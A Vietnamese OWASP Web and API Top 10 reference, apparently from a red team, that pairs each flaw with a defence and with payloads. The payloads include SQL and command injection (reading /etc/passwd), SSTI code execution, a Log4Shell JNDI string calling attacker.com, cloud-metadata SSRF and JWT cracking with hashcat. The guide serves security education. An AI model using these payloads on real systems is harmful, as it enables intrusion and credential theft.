# HƯỚNG DẪN CHUYÊN SÂU LỖ HỔNG WEB & API THEO CHUẨN OWASP
## DEEP-DIVE: OWASP WEB TOP 10 (2021) & API SECURITY TOP 10 (2023)
**Mã hiệu:** `SEC-REF-OWASP-WEB-API-2026`  
**Phiên bản:** `v3.0 - Web & API Exploitation Standard`  
**Đơn vị biên soạn:** Đội ngũ Chuyên gia Tác chiến An toàn Thông tin (Red Team Operations)  
**Phạm vi:** Phân tích kỹ thuật chuyên sâu, cơ chế hoạt động, payload thực chiến và giải pháp phòng thủ cho 10 lỗ hổng Web và 10 lỗ hổng API hàng đầu thế giới.

---

## PHẦN I: OWASP WEB APPLICATION TOP 10 (2021)

### A01: Broken Access Control (Kiểm soát Truy cập Bị phá vỡ)
- **Bản chất:** Hệ thống không kiểm tra quyền hạn hợp lệ khi người dùng yêu cầu thao tác trên tài nguyên của người khác hoặc các chức năng quản trị.
- **Biến thể phổ biến:** IDOR (Insecure Direct Object Reference), Privilege Escalation (Horizonal/Vertical), Metadata Manipulation.
- **Kịch bản Khai thác:**
  - Thay đổi tham số `user_id` trên URL: `GET /api/v1/profile?user_id=105` sửa thành `GET /api/v1/profile?user_id=1` (ID của Admin).
  - Khai thác Forced Browsing: Truy cập trực tiếp trang `/admin/dashboard` khi chưa xác thực.
- **Phòng ngừa:** Luôn kiểm tra quyền sở hữu đối tượng ở tầng Controller/Business Logic: `if (resource.ownerId != currentUser.id && !currentUser.isAdmin) throw ForbiddenException()`.

---

### A02: Cryptographic Failures (Lỗi Mật mã học)
- **Bản chất:** Truyền tải hoặc lưu trữ dữ liệu nhạy cảm ở dạng bản rõ (Plaintext) hoặc sử dụng các thuật toán mật mã yếu, đã lỗi thời.
- **Kịch bản Khai thác:**
  - Truyền dữ liệu qua HTTP hoặc sử dụng giao thức TLS 1.0/1.1 cũ bị tấn công POODLE/BEAST.
  - Sử dụng hàm băm MD5/SHA1 không có Salt để lưu trữ mật khẩu, bị bẻ khóa bằng Rainbow Table trong vài giây.
- **Phòng ngừa:** Mã hóa toàn bộ dữ liệu khi lưu trữ (AES-256-GCM) và truyền tải (TLS 1.3); băm mật khẩu bằng các thuật toán chịu tải tính toán cao như Argon2id, bcrypt hoặc PBKDF2.

---

### A03: Injection (Các Lỗ hổng Tiêm lệnh)
- **Bản chất:** Dữ liệu do người dùng nhập không được lọc hoặc tham số hóa, được gửi thẳng vào trình thông dịch (SQL, Command, LDAP, XPath).
- **Biến thể phổ biến:** SQL Injection, OS Command Injection, LDAP Injection, SSTI (Server-Side Template Injection).
- **Kịch bản Khai thác:**
  - **SQL Injection:**
    `username: admin' OR '1'='1' --`
    `UNION SELECT 1, table_name, 3 FROM information_schema.tables --`
  - **Command Injection:**
    `ip=127.0.0.1; cat /etc/passwd` hoặc `ip=127.0.0.1 && whoami`
  - **SSTI:**
    `{{7*7}}` hiển thị `49`, sau đó tiêm `{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}`.
- **Phòng ngừa:** Tuyệt đối không nối chuỗi (String Concatenation); bắt buộc dùng Parameterized Queries / Prepared Statements.

---

### A04: Insecure Design (Thiết kế Thiếu An toàn)
- **Bản chất:** Sai sót ngay từ khâu kiến trúc và mô hình hóa mối đe dọa (Threat Modeling), không phải do lỗi code.
- **Kịch bản Khai thác:**
  - Quy trình khôi phục mật khẩu chỉ yêu cầu câu hỏi bí mật dễ đoán ("Bạn sinh ở đâu?").
  - Hệ thống thương mại điện tử cho phép người dùng thay đổi giá tiền sản phẩm trong giỏ hàng: `price=-100`.
- **Phòng ngừa:** Áp dụng Chu trình Phát triển Phần mềm An toàn (Secure SDLC), Threat Modeling (STRIDE/DREAD) trước khi viết code.

---

### A05: Security Misconfiguration (Cấu hình Sai sót về Bảo mật)
- **Bản chất:** Bật các tính năng không cần thiết, giữ nguyên mật khẩu mặc định, hiển thị thông báo lỗi chi tiết (Stack Trace) chứa thông tin nhạy cảm.
- **Kịch bản Khai thác:**
  - Bật Directory Listing cho phép xem toàn bộ file trong thư mục: `http://target.com/backup/`.
  - Giữ tài khoản mặc định `admin:admin` trên Tomcat Web Application Manager, tải lên file WAR độc hại để chiếm shell.
- **Phòng ngừa:** Tự động hóa việc cấu hình an toàn (Hardening Scripts / Ansible / Terraform); tắt thông báo lỗi chi tiết ở môi trường Production.

---

### A06: Vulnerable and Outdated Components (Sử dụng Thư viện Lỗi thời)
- **Bản chất:** Ứng dụng tích hợp các thư viện bên thứ ba (Third-party packages, npm, pip, maven) có lỗ hổng CVE đã công bố.
- **Kịch bản Khai thác:**
  - Khai thác Log4Shell (CVE-2021-44228) bằng chuỗi JNDI: `${jndi:ldap://attacker.com/a}`.
  - Khai thác Struts2 Remote Code Execution (CVE-2017-5638).
- **Phòng ngừa:** Sử dụng công cụ SCA (Software Composition Analysis) như Snyk, OWASP Dependency-Check, Dependabot trong CI/CD pipeline.

---

### A07: Identification and Authentication Failures (Lỗi Định danh & Xác thực)
- **Bản chất:** Không bảo vệ chống tấn công Brute-force, cho phép sử dụng mật khẩu yếu, phiên làm việc không bị hủy sau khi đăng xuất.
- **Kịch bản Khai thác:**
  - Tấn công Password Spraying: Thử 1 mật khẩu phổ biến (`Autumn2026!`) trên hàng ngàn tài khoản để tránh bị khóa tài khoản.
  - Session Fixation: Gán trước Session ID cho nạn nhân, khi nạn nhân đăng nhập thì Session ID vẫn giữ nguyên.
- **Phòng ngừa:** Triển khai Multi-Factor Authentication (MFA); giới hạn số lần thử đăng nhập (Rate Limiting / Account Lockout); tái sinh Session ID mới sau khi đăng nhập thành công.

---

### A08: Software and Data Integrity Failures (Lỗi Toàn vẹn Phần mềm & Dữ liệu)
- **Bản chất:** Sử dụng mã nguồn hoặc dữ liệu từ nguồn không tin cậy mà không xác thực chữ ký số; lỗ hổng giải tuần tự hóa (Insecure Deserialization).
- **Kịch bản Khai thác:**
  - Khai thác Python `pickle.loads()` hoặc Java `ObjectInputStream` để thực thi mã lệnh tùy ý khi giải mã đối tượng độc hại.
- **Phòng ngừa:** Kiểm tra chữ ký số (Signatures / Hashes) của gói phần mềm; không sử dụng các định dạng tuần tự hóa cho phép thực thi mã lệnh.

---

### A09: Security Logging and Monitoring Failures (Thiếu sót Ghi log & Giám sát)
- **Bản chất:** Hệ thống không ghi lại các sự kiện đáng ngờ (đăng nhập thất bại hàng loạt, quét lỗ hổng), hoặc log không được đẩy về hệ thống tập trung (SIEM).
- **Kịch bản Khai thác:** Kẻ tấn công có thể rà quét và thử nghiệm mã khai thác trong nhiều tháng mà không bị đội ngũ SOC phát hiện.
- **Phòng ngừa:** Ghi nhận đầy đủ ngữ cảnh sự kiện (Thời gian, IP nguồn, User ID, Hành động); cảnh báo tự động về SIEM khi phát hiện hành vi dị thường.

---

### A10: Server-Side Request Forgery (SSRF - Giả mạo Yêu cầu Phía Máy chủ)
- **Bản chất:** Ứng dụng web cho phép người dùng cung cấp một URL và máy chủ sẽ trực tiếp gửi yêu cầu HTTP đến URL đó mà không lọc IP.
- **Kịch bản Khai thác:**
  - Ép máy chủ gọi đến các dịch vụ nội bộ (Loopback / Private LAN): `url=http://localhost:6379` (Redis) hoặc `http://192.168.1.1/admin`.
  - Khai thác lấy Token đám mây: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
- **Phòng ngừa:** Thiết lập danh sách cho phép (Allowlist) tên miền; chặn toàn bộ dải IP riêng (RFC 1918) và IP Link-Local (169.254.0.0/16).

---

## PHẦN II: OWASP API SECURITY TOP 10 (2023)

| Mã lỗ hổng | Tên Lỗ hổng | Bản chất Kỹ thuật | Kịch bản Red Team |
|---|---|---|---|
| **API1:2023** | Broken Object Level Authorization (BOLA) | Tương tự IDOR trên Web API. Không kiểm tra quyền truy cập bản ghi. | Thay đổi `/api/orders/{order_id}` để xem đơn hàng của người dùng khác. |
| **API2:2023** | Broken Authentication | Thiếu kiểm tra token, JWT secret yếu, lộ API Key. | Bẻ khóa JWT Secret bằng `hashcat -m 16500`, giả mạo token Admin. |
| **API3:2023** | Broken Object Property Level Authorization | Cho phép người dùng ghi đè các trường nhạy cảm (Mass Assignment). | Gửi thêm trường `"isAdmin": true` hoặc `"balance": 999999` trong JSON Body. |
| **API4:2023** | Unrestricted Resource Consumption | Không giới hạn tần suất gọi API (Rate Limit) hoặc kích thước request. | Gửi hàng triệu request làm cạn kiệt tài nguyên CPU/RAM/Database của API. |
| **API5:2023** | Broken Function Level Authorization (BFLA) | Không kiểm tra quyền hạn ở mức chức năng (Endpoint). | Người dùng thường gọi endpoint `/api/admin/deleteUser`. |
| **API6:2023** | Unrestricted Access to Sensitive Business Flows | Lạm dụng các luồng nghiệp vụ hợp pháp một cách tự động hóa. | Viết script bot mua vét toàn bộ vé hòa nhạc hoặc mã giảm giá trong 1 giây. |
| **API7:2023** | Server-Side Request Forgery (SSRF) | API nhận URL webhook và gửi request không an toàn. | Khai thác webhook để quét mạng nội bộ của nhà cung cấp dịch vụ. |
| **API8:2023** | Security Misconfiguration | Bật chế độ Debug, lộ thông tin cấu hình qua Swagger/GraphQL schema. | Đọc tài liệu `/swagger.json` hoặc chạy GraphQL Introspection query để khám phá toàn bộ API ẩn. |
| **API9:2023** | Improper Inventory Management | Quên tắt các phiên bản API cũ (Shadow API / Zombie API). | Tấn công endpoint `/api/v1/login` không có bảo vệ chống Brute-force dù hệ thống đã lên `v2`. |
| **API10:2023** | Unsafe Consumption of APIs | Tin tưởng mù quáng vào dữ liệu trả về từ các API bên thứ ba. | Giả mạo phản hồi của bên thứ ba để chèn mã độc vào hệ thống chính. |

---
*Tài liệu tham khảo chuyên sâu này giúp học viên và kỹ sư an toàn thông tin nắm vững toàn bộ các bề mặt tấn công Web & API hiện đại.*
